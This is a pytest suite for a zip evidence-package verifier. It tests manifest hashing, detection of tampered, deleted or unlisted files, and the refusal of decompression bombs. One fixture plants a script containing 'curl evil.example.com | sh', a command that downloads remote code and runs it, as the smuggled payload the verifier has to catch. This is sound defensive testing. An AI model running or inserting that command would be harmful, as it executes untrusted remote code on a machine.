"""An evidence package must be verifiable by someone who does not trust us yet.

Import verification tells a user who already runs this installation that the
bytes survived the trip. That is a different job from evidence verification,
whose audience is a colleague who received a zip, a reviewer checking a
submission, or the same user six months later on another machine. They need to
establish the package is intact *before* letting it near a daemon, so the
verifier depends on nothing but the standard library and reads only the archive.

The four tamper shapes below are ordered by subtlety. The third is the one that
justifies hashing the manifest itself: rewriting a payload *and* its recorded
hash together defeats every per-file check, and only the manifest's own digest
notices. The fourth is the one that justifies rejecting unlisted files —
checking only what the manifest lists would happily pass an archive with an
added payload, which is precisely how a "verified" package smuggles something.
"""
import hashlib
import json
import zipfile
from pathlib import Path

import pytest

from openai4s.evidence import EvidenceError, verify_package


def _canonical(payload) -> bytes:
    return json.dumps(
        payload, ensure_ascii=False, sort_keys=True, separators=(",", ":")
    ).encode("utf-8")


def _make_package(tmp_path: Path, files: dict[str, bytes] | None = None) -> Path:
    """A package built the way the exporter builds one."""
    payload = (
        files
        if files is not None
        else {
            "notebook.json": b'{"cells": []}',
            "artifacts.json": b"[]",
        }
    )
    body = {
        "format": "openai4s.session",
        "schema_version": 1,
        "files": [
            {"path": n, "size": len(d), "sha256": hashlib.sha256(d).hexdigest()}
            for n, d in sorted(payload.items())
        ],
    }
    manifest = {**body, "manifest_sha256": hashlib.sha256(_canonical(body)).hexdigest()}
    target = tmp_path / "pkg.zip"
    with zipfile.ZipFile(target, "w") as archive:
        for name, data in payload.items():
            archive.writestr(name, data)
        archive.writestr("manifest.json", _canonical(manifest))
    return target


def _rebuild(source: Path, target: Path, mutate) -> Path:
    with zipfile.ZipFile(source) as archive:
        files = {n: archive.read(n) for n in archive.namelist()}
    mutate(files)
    with zipfile.ZipFile(target, "w") as archive:
        for name, data in files.items():
            archive.writestr(name, data)
    return target


# --------------------------------------------------------------------------
# the happy path
# --------------------------------------------------------------------------


def test_an_untampered_package_verifies(tmp_path):
    report = verify_package(_make_package(tmp_path))
    assert report["ok"] is True
    assert report["problems"] == []
    assert set(report["files_verified"]) == {"notebook.json", "artifacts.json"}


def test_the_report_does_not_overclaim(tmp_path):
    """ "Verified" must not quietly imply authorship. Anyone can rewrite the
    payload and the manifest together and re-seal it; detecting that needs a
    signature by a key the verifier already trusts, which is a distribution
    decision this format does not make."""
    report = verify_package(_make_package(tmp_path))
    assert "does not establish who produced" in report["verifies"]


def test_the_archive_digest_is_reported(tmp_path):
    """So a recipient can quote one value back to the sender."""
    package = _make_package(tmp_path)
    report = verify_package(package)
    assert report["archive_sha256"] == hashlib.sha256(package.read_bytes()).hexdigest()


# --------------------------------------------------------------------------
# tampering, by increasing subtlety
# --------------------------------------------------------------------------


def test_a_modified_payload_is_caught(tmp_path):
    def mutate(files):
        files["notebook.json"] = b'{"tampered": true}'

    report = verify_package(
        _rebuild(_make_package(tmp_path), tmp_path / "t.zip", mutate)
    )
    assert report["ok"] is False
    assert any("content hash mismatch" in p for p in report["problems"])


def test_a_deleted_file_is_caught(tmp_path):
    def mutate(files):
        files.pop("notebook.json")

    report = verify_package(
        _rebuild(_make_package(tmp_path), tmp_path / "t.zip", mutate)
    )
    assert report["ok"] is False
    assert any("absent" in p for p in report["problems"])


def test_rewriting_a_payload_and_its_recorded_hash_together_is_caught(tmp_path):
    """The attack every per-file check misses, and the reason the manifest has
    to vouch for itself."""

    def mutate(files):
        files["notebook.json"] = b'{"tampered": true}'
        manifest = json.loads(files["manifest.json"])
        for entry in manifest["files"]:
            if entry["path"] == "notebook.json":
                entry["sha256"] = hashlib.sha256(files["notebook.json"]).hexdigest()
                entry["size"] = len(files["notebook.json"])
        files["manifest.json"] = _canonical(manifest)

    report = verify_package(
        _rebuild(_make_package(tmp_path), tmp_path / "t.zip", mutate)
    )
    assert report["ok"] is False
    assert any("manifest_sha256 mismatch" in p for p in report["problems"])


def test_an_unlisted_extra_file_is_caught(tmp_path):
    """Checking only the listed files would pass an archive with an added
    payload — exactly how a "verified" package smuggles something."""

    def mutate(files):
        files["extra.sh"] = b"#!/bin/sh\ncurl evil.example.com | sh\n"

    report = verify_package(
        _rebuild(_make_package(tmp_path), tmp_path / "t.zip", mutate)
    )
    assert report["ok"] is False
    assert any("not in the manifest" in p for p in report["problems"])


def test_a_manifest_without_its_own_digest_is_flagged(tmp_path):
    def mutate(files):
        manifest = json.loads(files["manifest.json"])
        manifest.pop("manifest_sha256")
        files["manifest.json"] = _canonical(manifest)

    report = verify_package(
        _rebuild(_make_package(tmp_path), tmp_path / "t.zip", mutate)
    )
    assert report["ok"] is False
    assert any("no manifest_sha256" in p for p in report["problems"])


def test_every_problem_is_reported_not_just_the_first(tmp_path):
    """Someone deciding whether to trust a file needs the full list, not
    whichever failure happened to be found first."""

    def mutate(files):
        files["notebook.json"] = b"changed"
        files["artifacts.json"] = b"also changed"

    report = verify_package(
        _rebuild(_make_package(tmp_path), tmp_path / "t.zip", mutate)
    )
    assert len(report["problems"]) >= 2


# --------------------------------------------------------------------------
# input that is not a package
# --------------------------------------------------------------------------


def test_a_missing_file_raises(tmp_path):
    with pytest.raises(EvidenceError, match="not a file"):
        verify_package(tmp_path / "absent.zip")


def test_a_non_zip_raises(tmp_path):
    junk = tmp_path / "j.zip"
    junk.write_bytes(b"not a zip at all")
    with pytest.raises(EvidenceError, match="zip"):
        verify_package(junk)


def test_a_zip_without_a_manifest_raises(tmp_path):
    plain = tmp_path / "p.zip"
    with zipfile.ZipFile(plain, "w") as archive:
        archive.writestr("a.txt", b"hello")
    with pytest.raises(EvidenceError, match="not an OpenAI4S package"):
        verify_package(plain)


def test_the_verifier_needs_no_daemon_or_store(tmp_path):
    """The point of "verifiable in a clean environment": the module must import
    and run without config, database, or network."""
    import subprocess
    import sys

    package = _make_package(tmp_path)
    proc = subprocess.run(
        [
            sys.executable,
            "-c",
            "import sys, json;"
            "from openai4s.evidence import verify_package;"
            f"print(json.dumps(verify_package({str(package)!r})['ok']))",
        ],
        capture_output=True,
        text=True,
        env={"PATH": "/usr/bin:/bin", "PYTHONPATH": str(Path.cwd())},
    )
    assert proc.returncode == 0, proc.stderr
    assert proc.stdout.strip() == "true"


# --------------------------------------------------------------------------
# a decompression bomb is refused before it can expand
# --------------------------------------------------------------------------


def test_a_high_ratio_zip_is_refused_before_reading(tmp_path):
    """verify_package reads the manifest and every member. A verifier is handed
    this file precisely because they do not trust it, so a small, high-ratio
    ZIP must be refused from the central directory, not expanded into memory
    and then rejected."""
    from openai4s.evidence import MAX_ENTRY_BYTES

    bomb = tmp_path / "bomb.zip"
    with zipfile.ZipFile(bomb, "w", compression=zipfile.ZIP_DEFLATED) as archive:
        # Just under the per-entry cap, but a ratio far past the limit — so the
        # ratio guard, not the size guard, is what must catch it.
        payload = b"0" * (MAX_ENTRY_BYTES - 1024)
        archive.writestr("manifest.json", payload)

    with pytest.raises(EvidenceError) as error:
        verify_package(bomb)
    assert "ratio" in str(error.value).lower() or "bomb" in str(error.value).lower()


def test_an_archive_with_too_many_entries_is_refused(tmp_path):
    from openai4s.evidence import MAX_ENTRIES

    many = tmp_path / "many.zip"
    with zipfile.ZipFile(many, "w") as archive:
        for i in range(MAX_ENTRIES + 5):
            archive.writestr(f"f{i}.txt", b"x")

    with pytest.raises(EvidenceError) as error:
        verify_package(many)
    assert "entries" in str(error.value).lower()


def test_a_single_oversized_member_is_refused(tmp_path):
    from openai4s.evidence import MAX_ENTRY_BYTES

    big = tmp_path / "big.zip"
    with zipfile.ZipFile(big, "w", compression=zipfile.ZIP_STORED) as archive:
        # Stored (ratio 1), so only the per-entry size cap catches it.
        archive.writestr("manifest.json", b"a" * (MAX_ENTRY_BYTES + 1))

    with pytest.raises(EvidenceError) as error:
        verify_package(big)
    assert "too large" in str(error.value).lower()
